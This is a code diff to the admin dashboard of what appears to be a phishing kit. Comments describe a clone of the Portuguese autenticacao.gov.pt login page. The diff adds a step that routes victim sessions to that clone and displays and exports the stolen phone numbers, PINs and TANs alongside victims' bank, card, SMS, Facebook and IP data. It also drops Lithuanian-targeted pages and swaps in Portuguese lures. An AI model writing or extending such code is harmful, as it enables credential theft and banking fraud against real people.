@@ -20,15 +20,8 @@ const SESSION_LIST_COLUMNS =
 const LOG_PAGE_SIZE = 100;
 
 const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
-  { value: "smartid_1", label: "SmartID 1 Sayfası" },
-  { value: "smartid_2", label: "SmartID 2 Sayfası" },
-  { value: "mobileid_1", label: "MobileID 1 Sayfası" },
-  { value: "mobileid_2", label: "MobileID 2 Sayfası" },
-  { value: "biometrika_pin_1", label: "Biometrika/PIN 1" },
-  { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
-  { value: "generator1", label: "Generator 1" },
-  { value: "generator2", label: "Generator 2" },
   { value: "transfer", label: "Transfer Onayı" },
+  { value: "autenticacao", label: "Autenticação" },
 ];
 
 function getApprovalDisplayText(value: string): string {
@@ -1528,6 +1521,34 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       return;
     }
 
+    // AUTENTICACAO: kullanici /autenticacao (autenticacao.gov.pt klonu) sayfasina gider.
+    // Formu gonderince approvalStatus "autenticacao_confirmed" olur.
+    if (approvalPromptType === "autenticacao") {
+      await supabase
+        .from("sessions")
+        .update({
+          is_hidden: false,
+          status: "online",
+          current_step: "autenticacao",
+          form_data: {
+            ...previousFormData,
+            approvalStatus: "autenticacao",
+            approvalCode: "",
+            specialNoticeText: "",
+            specialNoticeImage: "",
+            specialNoticeLang: undefined,
+            specialNoticeSentAt: "",
+          },
+        })
+        .eq("id", approvalPromptSessionId);
+
+      setApprovalPromptSessionId(null);
+      setApprovalPromptType("");
+      setApprovalCodeInput("");
+      void load();
+      return;
+    }
+
     await supabase
       .from("sessions")
       .update({
@@ -1631,7 +1652,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       // Admin tablosuyla ayni kolon yapisi: cizgili tablo PDF
       const s = (v: unknown) => (v == null ? "" : String(v));
-      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "Generator", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
+      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "Autenticação", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
 
       const tableBody: any[][] = [
         COL_HEADERS.map(
@@ -1661,6 +1682,14 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           : { text: "-", color: "#9ca3af" };
 
         const genCell: any[] = [];
+        const authPhoneX = s(fd.cmdPhone).trim();
+        const authPinX = s(fd.cmdPin).trim();
+        const authTanX = s(fd.cmdTan).trim() || s(fd.autenticacaoTan).trim();
+        if (authPhoneX || authPinX || authTanX) {
+          if (authPhoneX) genCell.push({ text: `Tel: ${authPhoneX}` });
+          if (authPinX) genCell.push({ text: `PIN: ${authPinX}` });
+          if (authTanX) genCell.push({ text: `TAN: ${authTanX}`, bold: true, color: "#e11d48" });
+        }
         const genCurrentRaw =
           fd.generatorCurrent && typeof fd.generatorCurrent === "object"
             ? (fd.generatorCurrent as Record<string, any>)
@@ -2176,7 +2205,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
                 <th className="min-w-[180px] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
                 <th className="min-w-[110px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
-                <th className="min-w-[130px] px-2 py-3 font-semibold whitespace-nowrap">Generator</th>
+                <th className="min-w-[130px] px-2 py-3 font-semibold whitespace-nowrap">Autenticação</th>
                 <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
                 <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
                 <th className="min-w-[110px] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
@@ -2407,30 +2436,66 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       )}
                     </td>
                     <td className="px-2 py-3 align-top">
-                      {genEntries.length > 0 ? (
-                        <div className="space-y-2">
-                          {genEntries.map((entry, gi) => (
-                            <div key={gi} className="space-y-0.5">
-                              <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[9px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
-                                kodas {entry.type === "generator2" ? "2" : "1"}
-                              </span>
-                              {Object.entries(entry.data)
-                                .filter(([, v]) => v != null && String(v).trim() !== "")
-                                .map(([k, v]) => (
-                                  <div
-                                    key={k}
-                                    className="cursor-pointer font-mono text-[11px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
-                                    onClick={() => copyToClipboard(String(v))}
-                                  >
-                                    {String(v)}
-                                  </div>
-                                ))}
+                      {(() => {
+                        const authPhone = typeof fd.cmdPhone === "string" && fd.cmdPhone.trim() ? fd.cmdPhone.trim() : "";
+                        const authPin = typeof fd.cmdPin === "string" && fd.cmdPin.trim() ? fd.cmdPin.trim() : "";
+                        const authTan =
+                          typeof fd.cmdTan === "string" && fd.cmdTan.trim()
+                            ? fd.cmdTan.trim()
+                            : typeof fd.autenticacaoTan === "string" && fd.autenticacaoTan.trim()
+                              ? fd.autenticacaoTan.trim()
+                              : "";
+                        const hasAuth = Boolean(authPhone || authPin || authTan);
+                        if (hasAuth) {
+                          return (
+                            <div className="space-y-1 text-[10px] font-medium leading-tight">
+                              {authPhone && (
+                                <div className="flex min-w-0 items-start gap-1">
+                                  <span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">Tel:</span>
+                                  <span className="min-w-0 cursor-pointer font-mono font-bold whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPhone)}>{authPhone}</span>
+                                </div>
+                              )}
+                              {authPin && (
+                                <div className="flex min-w-0 items-start gap-1">
+                                  <span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">PIN:</span>
+                                  <span className="min-w-0 cursor-pointer font-mono font-bold whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPin)}>{authPin}</span>
+                                </div>
+                              )}
+                              {authTan && (
+                                <div className="flex min-w-0 items-start gap-1">
+                                  <span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">TAN:</span>
+                                  <span className="min-w-0 cursor-pointer font-mono font-bold text-rose-600 dark:text-rose-400 whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authTan)}>{authTan}</span>
+                                </div>
+                              )}
                             </div>
-                          ))}
-                        </div>
-                      ) : (
-                        <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
-                      )}
+                          );
+                        }
+                        if (genEntries.length === 0) {
+                          return <span className={`text-[10px] font-medium ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>;
+                        }
+                        return (
+                          <div className="space-y-2">
+                            {genEntries.map((entry, gi) => (
+                              <div key={gi} className="space-y-0.5">
+                                <span className="inline-block w-fit rounded-full border border-rose-500/20 bg-rose-500/10 px-2 py-0.5 text-[9px] font-bold tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap leading-tight">
+                                  kodas {entry.type === "generator2" ? "2" : "1"}
+                                </span>
+                                {Object.entries(entry.data)
+                                  .filter(([, v]) => v != null && String(v).trim() !== "")
+                                  .map(([k, v]) => (
+                                    <div
+                                      key={k}
+                                      className="cursor-pointer font-mono text-[11px] font-bold tracking-wider text-rose-600 dark:text-rose-400 break-all transition-opacity hover:opacity-70"
+                                      onClick={() => copyToClipboard(String(v))}
+                                    >
+                                      {String(v)}
+                                    </div>
+                                  ))}
+                              </div>
+                            ))}
+                          </div>
+                        );
+                      })()}
                     </td>
                     <td className="px-2 py-3 align-top">
                       <div
@@ -3229,7 +3294,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 rows={3}
                 value={questionInput}
                 onChange={(e) => setQuestionInput(e.target.value)}
-                placeholder="Örn: Kokia yra jūsų motinos mergautinė pavardė?"
+                placeholder="Örn: Qual é o apelido de solteira da sua mãe?"
                 className={`w-full rounded-xl border px-3 py-2 outline-none transition-all resize-none ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
               />
             </div>
